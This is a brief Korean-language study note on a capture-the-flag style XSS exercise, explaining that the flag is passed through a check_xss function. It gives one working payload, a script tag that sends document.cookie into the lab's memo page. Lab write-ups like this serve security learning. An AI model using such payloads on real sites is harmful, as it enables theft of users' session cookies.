# Exercise: XSS

![Untitled](Exercise%20XSS%20fac91bbaf097495b95e13b2884c8b1c5/Untitled.png)

![Untitled](Exercise%20XSS%20fac91bbaf097495b95e13b2884c8b1c5/Untitled%201.png)

---

## [함께실습] XSS

1. flag page가 핵심
2. check_xss 함수로 flag라는 이름의 어떤 값을 넘겨주는데 이 값이 바로 플래그이다.

![Untitled](Exercise%20XSS%20fac91bbaf097495b95e13b2884c8b1c5/Untitled%202.png)

1. <script>location.href="/memo?memo="+document.cookie;</script>를 입력하면 memo 장에 쿠키 값을 출력한다.
    
    ![Untitled](Exercise%20XSS%20fac91bbaf097495b95e13b2884c8b1c5/Untitled%203.png)